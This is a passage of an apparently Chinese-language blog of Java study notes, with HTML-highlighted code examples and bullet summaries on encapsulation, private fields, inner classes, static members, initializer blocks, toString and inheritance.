stu.myName();</span></span><br><span class="line"><span class="comment">        stu.myInfo();*/</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h1> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String add;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;姓名：&quot;</span> + name + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot; 年龄：&quot;</span> + age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">pe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        pe.setName(<span class="string">&quot;yxz&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="private"><a href="#private" class="headerlink" title="private"></a>private</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Alpha</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> iamprivate;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Alpha</span><span class="params">( <span class="type">int</span> i)</span>&#123;</span><br><span class="line">        iamprivate=i;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isEqualTo</span><span class="params">(Alpha anotherAlpha)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.iamprivate == anotherAlpha.iamprivate)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">       Alpha aa=<span class="keyword">new</span> <span class="title class_">Alpha</span>(<span class="number">10</span>);</span><br><span class="line">       Alpha bb=<span class="keyword">new</span> <span class="title class_">Alpha</span>(<span class="number">12</span>);</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">if</span>(aa.isEqualTo(bb))&#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;equal &quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;not equal &quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果是nuo equal </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mport java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="keyword">while</span> (scanner.hasNextInt()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">            p.setAge(age);</span><br><span class="line">            System.out.println(p.getAge());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//write your code here......</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.age &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.age &gt; <span class="number">200</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">200</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Outer</span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 定义内部类Inner */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inner</span>&#123; </span><br><span class="line">    </span><br><span class="line">        <span class="comment">//将外包类的成员变量size递增</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doStuff</span><span class="params">()</span>&#123; </span><br><span class="line">            size++;   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Inner i=<span class="keyword">new</span> <span class="title class_">Inner</span>(); <span class="comment">//成员变量i指向Inner类的对象</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">increaseSize</span><span class="params">()</span>&#123; </span><br><span class="line">        i.doStuff(); <span class="comment">//调用内部类Inner的方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] a)</span>&#123; </span><br><span class="line">        Outer o=<span class="keyword">new</span> <span class="title class_">Outer</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i&lt;<span class="number">4</span>; i++)&#123;</span><br><span class="line">           o.increaseSize();</span><br><span class="line">           System.out.println(<span class="string">&quot;The value of size : &quot;</span>+o.size);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Outer</span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 定义内部类Inner */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inner</span>&#123; </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> size;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doStuff</span><span class="params">(<span class="type">int</span> size)</span>&#123; </span><br><span class="line">            size++; <span class="comment">//存取局部变量</span></span><br><span class="line">            <span class="built_in">this</span>.size++;  <span class="comment">//存取内部类的成员变量</span></span><br><span class="line">            Outer.<span class="built_in">this</span>.size++; <span class="comment">//存取其外包类Outer的成员变量</span></span><br><span class="line">            System.out.println(<span class="string">&quot;size in Inner.doStuff(): &quot;</span>+size);</span><br><span class="line">            System.out.println(<span class="string">&quot;size of the Inner class: &quot;</span>+<span class="built_in">this</span>.size);</span><br><span class="line">            System.out.println(<span class="string">&quot;size of the Outer class:  &quot;</span>+Outer.<span class="built_in">this</span>.size);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Inner i=<span class="keyword">new</span> <span class="title class_">Inner</span>(); <span class="comment">//成员变量i指向Inner类的对象</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">increaseSize</span><span class="params">(<span class="type">int</span> s)</span>&#123; </span><br><span class="line">        i.doStuff(s); <span class="comment">//调用内部类Inner的方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] a)</span>&#123; </span><br><span class="line">        Outer o=<span class="keyword">new</span> <span class="title class_">Outer</span>();</span><br><span class="line">        </span><br><span class="line">        o.increaseSize(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Outer</span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> size=<span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 方法makeInner()，返回一内部类对象 */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">makeInner</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> finalLocalVar)</span>&#123; </span><br><span class="line">        <span class="type">int</span> LocalVar=<span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">Inner</span>&#123; </span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123; </span><br><span class="line">                <span class="keyword">return</span> (<span class="string">&quot;#&lt;Inner size=&quot;</span>+size+</span><br><span class="line">                 </span><br><span class="line">                <span class="string">&quot; finalLocalVar=&quot;</span>+finalLocalVar+<span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Inner</span>(); <span class="comment">//方法makeInner()返回一内部类对象</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Outer outer=<span class="keyword">new</span> <span class="title class_">Outer</span> ();</span><br><span class="line">        Object obj=outer.makeInner(<span class="number">40</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;The object is &quot;</span>+obj.toString());</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OuterClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> data1;</span><br><span class="line">    <span class="type">int</span> data2;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> data3;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;OuterClass:;test()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//实例内部类</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">InnerClass</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="variable">data1</span> <span class="operator">=</span> <span class="number">122</span>;<span class="comment">//就近原则，若非要外部类中的data1则可以用Outer.this.data1;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> data4;</span><br><span class="line">        <span class="type">int</span> data5;</span><br><span class="line">        <span class="comment">//public static int data5; // error static是类的成员，Inner和成员是一级的</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">data6</span> <span class="operator">=</span> <span class="number">6</span>;<span class="comment">//但需要更高的版本，加上final变成常量了</span></span><br><span class="line">        <span class="comment">//实力内部类当中，不能有静态成员变量，非要定义用final</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">func</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;InnerClass::func()&quot;</span>);</span><br><span class="line">            System.out.println(OuterClass.<span class="built_in">this</span>.data1);</span><br><span class="line">            System.out.println(data2);</span><br><span class="line">            System.out.println(data3);</span><br><span class="line">            System.out.println(data4);</span><br><span class="line">            System.out.println(data5);</span><br><span class="line">            System.out.println(data6);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Inner&quot;</span>);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">10</span>;<span class="comment">//定义常量，在编译时就确定了，一旦初始化，不能修改</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">OuterClass</span> <span class="variable">oc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OuterClass</span>();</span><br><span class="line">        System.out.println(oc.data1);</span><br><span class="line">        OuterClass.<span class="type">InnerClass</span> <span class="variable">ic</span> <span class="operator">=</span> oc.<span class="keyword">new</span> <span class="title class_">InnerClass</span>();<span class="comment">//获取实例内部类对象</span></span><br><span class="line">        ic.func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>外部类中的任何成员都可以在实例内部类方法中直接访问</li><li>实力内部类所在位置与外部类成员位置相同，因此也受public 等访问限制符的约束</li><li>在实例内部类中访问同名的成员时优先访问自己的，如果要访问外部类的同名成员，必须用：外部类名.this.同名成员来访问</li><li>实例内部类对象必须是在先有外部类对象的前提下才能创建</li><li>实力内部类的非静态方法包含了一个指向外部类的引用</li><li>外部类中，不能直接访问实例内部了中的成员，如果要访问不许先创建内部类的对象</li></ul><h2 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OuterClass2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">data1</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">data2</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">data3</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;out::test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">InnerClass2</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="variable">data4</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">data5</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">data6</span> <span class="operator">=</span> <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">func</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;inn::test&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*System.out.println(this.data1);</span></span><br><span class="line"><span class="comment">            System.out.println(data2);*/</span><span class="comment">//无法访问外部类的非静态成员</span></span><br><span class="line">            <span class="comment">//非要访问</span></span><br><span class="line">            <span class="type">OuterClass2</span> <span class="variable">oc3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OuterClass2</span>();</span><br><span class="line">            System.out.println(oc3.data1);</span><br><span class="line">            System.out.println(data3);</span><br><span class="line">            System.out.println(data4);</span><br><span class="line">            System.out.println(data5);</span><br><span class="line">            System.out.println(data6);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        OuterClass2.<span class="type">InnerClass2</span> <span class="variable">oc2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OuterClass2</span>.InnerClass2();<span class="comment">//这样不需要先创建外部类对象</span></span><br><span class="line">        oc2.func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>静态内部类中只能访问外部类中的静态成员</li><li>非要访问，得新建一个外部类对象</li><li>创建静态内部类是不需要创建外部类对象</li></ul><h2 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">Inner</span> &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;dasdsadsad&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Inner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Inner</span>();</span><br><span class="line">        in.test();<span class="comment">//只能在方法中使用</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>局部内部类只能在所定义得方法体内部使用</li><li>不能被public，static等修饰</li><li>几乎不会被使用</li></ul><h2 id="匿名内部类-学完接口回来"><a href="#匿名内部类-学完接口回来" class="headerlink" title="匿名内部类(学完接口回来)"></a>匿名内部类(学完接口回来)</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h1 id="static"><a href="#static" class="headerlink" title="static"></a>static</h1><ul><li>static 修饰的成员变量称为静态成员变量，最大特性是：不属于某个具体的对象，是所有对象所共享的。<br><em>静态成员变量特征</em></li><li>不属于某个具体的对象，是类的属性，是所有对象所共享的。不存在某个对象的空间中。</li><li>既可以通过对象访问，也可以通过类名访问，但一般推荐类名访问</li><li>类变量储存在方法区中</li><li>生命周期伴随类的一生，随类的加载而创建，随类的卸载而销毁</li><li>静态的方法内也不能访问非静态的成员或方法但非静态的可以</li><li>静态方法无法重写，不能用来实现多态</li><li>初始化要么在类内，要么在类外</li></ul><h1 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Stu</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;yxz&quot;</span>;<span class="comment">//就地初始化，但只适合默认的一些量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Stu</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;不带参数的构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;实例代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Stu</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stu</span>();<span class="comment">//静态的执行的更快</span></span><br><span class="line">        <span class="type">Stu</span> <span class="variable">stu2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stu</span>();<span class="comment">//static只会执行1次，赋值时如果都是static就看顺序</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="对象的打印"><a href="#对象的打印" class="headerlink" title="对象的打印"></a>对象的打印</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;A&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;a=&quot;</span> + a +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">OuterClass2</span>());<span class="comment">//匿名对象 ,只能使用一次</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>右键-&gt;生成-&gt;toString()</p><h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;正在吃饭！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">barks</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;汪汪叫！&quot;</span> + <span class="string">&quot;年龄&quot;</span> + age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">catchMouse</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;正在抓老鼠&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        dog.name = <span class="string">&quot;ctl&quot;</span>;</span><br><span class="line">        dog.age = <span class="number">12</span>;</span><br><span class="line">        dog.barks();</span><br><span class="line">        dog.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>子类会将父类的成员变量和方法继承到子类中</li><li>子类继承父类之后，必须要添加自己特有的成员，体现出与基类的不同，否则就没必要继承了。</li><li>私有的成员可以被继承但不能访问，所以会报错</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodA</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Base中的methodA()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Jc2</span> <span class="keyword">extends</span> <span class="title class_">Base</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="type">int</span> c;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">methodB</span><span class="params">()</span> &#123;</span><br><span class="line">        a = <span class="number">10</span>;<span class="comment">//当父类和字类拥有同名变量时，优先访问类自己的</span></span><br><span class="line">        <span class="built_in">super</span>.b = <span class="number">20</span>;</span><br><span class="line">        c = <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(b);</span><br><span class="line">        System.out.println(<span class="built_in">super</span>.b);</span><br><span class="line">        System.out.println(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Jc2</span> <span class="variable">jc2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Jc2</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Base</span> <span class="variable">base</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Base</span>();</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodA</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Base中的methodA()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Jc2</span> <span class="keyword">extends</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"><span class="comment">/*    public void methodA() &#123;</span></span><br><span class="line"><span class="comment">        System.out.println(&quot;Jc2中的methodA（）&quot;);</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line">    <span 